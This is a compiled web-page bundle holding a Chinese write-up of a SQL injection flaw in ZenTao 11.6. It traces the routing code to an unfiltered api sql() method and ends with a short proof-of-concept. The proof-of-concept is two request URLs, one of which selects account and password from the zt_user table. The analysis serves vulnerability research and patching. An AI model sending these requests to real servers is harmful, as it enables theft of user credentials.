        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$methodName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">triggerError</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;the module <span class="token interpolation"><span class="token variable">$moduleName</span></span> has no <span class="token interpolation"><span class="token variable">$methodName</span></span> method&quot;</span><span class="token punctuation">,</span> <span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token variable">$exit</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">control</span> <span class="token operator">=</span> <span class="token variable">$module</span><span class="token punctuation">;</span>

        <span class="token comment">/* include default value for module*/</span>
        <span class="token variable">$defaultValueFiles</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getTmpRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;defaultvalue/*.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$defaultValueFiles</span><span class="token punctuation">)</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$defaultValueFiles</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span>

        <span class="token comment">/* 
         * 使用反射机制获取函数参数的默认值。
         * Get the default settings of the method to be called using the reflecting. 
         *
         * */</span>
        <span class="token variable">$defaultParams</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$methodReflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">reflectionMethod</span><span class="token punctuation">(</span><span class="token variable">$className</span><span class="token punctuation">,</span> <span class="token variable">$methodName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$methodReflect</span><span class="token operator">-&gt;</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token operator">-&gt;</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;_NOT_SET&#39;</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$paramDefaultValue</span><span class="token punctuation">[</span><span class="token variable">$appName</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$className</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$methodName</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token variable">$paramDefaultValue</span><span class="token punctuation">[</span><span class="token variable">$appName</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$className</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$methodName</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$paramDefaultValue</span><span class="token punctuation">[</span><span class="token variable">$className</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$methodName</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token variable">$paramDefaultValue</span><span class="token punctuation">[</span><span class="token variable">$className</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$methodName</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$param</span><span class="token operator">-&gt;</span><span class="token function">isDefaultValueAvailable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token variable">$param</span><span class="token operator">-&gt;</span><span class="token function">getDefaultValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$defaultParams</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token doc-comment comment">/** 
         * 根据PATH_INFO或者GET方式设置请求的参数。
         * Set params according PATH_INFO or GET.
         */</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;GET&#39;</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setParamsByPathInfo</span><span class="token punctuation">(</span><span class="token variable">$defaultParams</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setParamsByGET</span><span class="token punctuation">(</span><span class="token variable">$defaultParams</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">framework</span><span class="token operator">-&gt;</span><span class="token property">filterParam</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$_GET</span>     <span class="token operator">=</span> <span class="token class-name static-context">validater</span><span class="token operator">::</span><span class="token function">filterParam</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;get&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_COOKIE</span>  <span class="token operator">=</span> <span class="token class-name static-context">validater</span><span class="token operator">::</span><span class="token function">filterParam</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;cookie&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">/* 调用该方法   Call the method. */</span>
        <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$methodName</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$module</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过之前获取的<strong>moduleName</strong>包含对应的<strong>control类</strong>文件并实例化，随后调用<strong>setParamsByPathInfo</strong>方法从路径中获取方法对应的参数值，最后通过<strong>call_user_func_array</strong>方法调用对应<strong>control类</strong>中的对应方法并赋值。</p><p>我们查看<strong>module/api/control.php</strong>文件中的<strong>getModel</strong>方法</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092029964.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里通过<strong>call_user_func_array</strong>函数调用所有的<strong>model文件</strong>的所有方法。</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$methodName</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以看到<strong>module/api/moudel.php</strong>中的<strong>sql函数</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">sql</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$keyField</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$sql</span>  <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;;&#39;</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">a</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;select &#39;</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lang</span><span class="token operator">-&gt;</span><span class="token property">api</span><span class="token operator">-&gt;</span><span class="token property">error</span><span class="token operator">-&gt;</span><span class="token property">onlySelect</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">try</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dao</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$keyField</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$rows</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$rows</span><span class="token punctuation">[</span><span class="token variable">$row</span><span class="token operator">-&gt;</span><span class="token variable">$keyField</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token variable">$rows</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,40),v=n("p",null,[s("这里并没有进行过滤，只使用了代码**"),n("span",{class:"katex"},[n("span",{class:"katex-mathml"},[n("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[n("semantics",null,[n("mrow",null,[n("mi",null,"s"),n("mi",null,"q"),n("mi",null,"l"),n("mo",null,"="),n("mi",null,"t"),n("mi",null,"r"),n("mi",null,"i"),n("mi",null,"m"),n("mo",{stretchy:"false"},"(")]),n("annotation",{encoding:"application/x-tex"},"sql=trim(")])])]),n("span",{class:"katex-html","aria-hidden":"true"},[n("span",{class:"base"},[n("span",{class:"strut",style:{height:"0.8889em","vertical-align":"-0.1944em"}}),n("span",{class:"mord mathnormal"},"s"),n("span",{class:"mord mathnormal",style:{"margin-right":"0.01968em"}},"ql"),n("span",{class:"mspace",style:{"margin-right":"0.2778em"}}),n("span",{class:"mrel"},"="),n("span",{class:"mspace",style:{"margin-right":"0.2778em"}})]),n("span",{class:"base"},[n("span",{class:"strut",style:{height:"1em","vertical-align":"-0.25em"}}),n("span",{class:"mord mathnormal"},"t"),n("span",{class:"mord mathnormal",style:{"margin-right":"0.02778em"}},"r"),n("span",{class:"mord mathnormal"},"im"),n("span",{class:"mopen"},"(")])])]),s("sql)**过滤了空格")],-1),m=a(`<p>我们看一下这里的调用这个方法需要的权限</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092030068.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里可以看到任何用户都可以调用这个模块的方法，所以我们用它调用<strong>sql</strong>方法进行查询(空格转换为+,绕过过滤)</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092030188.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功执行sql语句</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><p>登陆后访问</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://xxx.xxx.xxx.xxx/api-getModel-user-getRealNameAndEmails-users=admin
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,10);function b(g,h){const p=e("ExternalLinkIcon");return o(),l("div",null,[r,n("p",null,[s("访问 "),n("a",u,[k,c(p)]),s(" 按步骤安装即可")]),d,v,m])}const $=t(i,[["render",b],["__file","禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞.html.vue"]]);export{$ as default};
